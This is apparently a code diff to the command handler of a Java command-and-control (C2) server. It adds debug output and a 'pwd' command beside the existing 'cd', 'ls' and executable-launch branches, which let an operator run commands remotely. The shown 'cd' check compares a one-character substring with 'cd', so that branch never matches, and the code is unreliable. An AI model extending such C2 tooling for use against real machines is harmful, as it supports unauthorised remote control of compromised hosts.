@@ -323,6 +323,8 @@ public class C2ServerUserHandler implements Runnable{
                     } else if (command.substring(0,1).equals("cd")){
                         // Change Current Directory
                         currentDirectory = command.substring(3);
+                        System.out.println("entered: " + command.substring(3));
+                        System.out.println("current dir: " + currentDirectory);
                         runCommand = false;
                     } else if (command.equals("ls")){
                         // List items of current directory
@@ -338,6 +340,9 @@ public class C2ServerUserHandler implements Runnable{
                         // If the first two characters are ./, then it is attempting to run an executable on linux in the current directory
                         // Because we are not actually in the current directory, we will just use the full executable name
                         command = currentDirectory + command.substring(2);
+                    } else if (command.equals("pwd")){
+                        System.out.println(currentDirectory);
+                        runCommand = false;
                     }
 
                     if(runCommand){
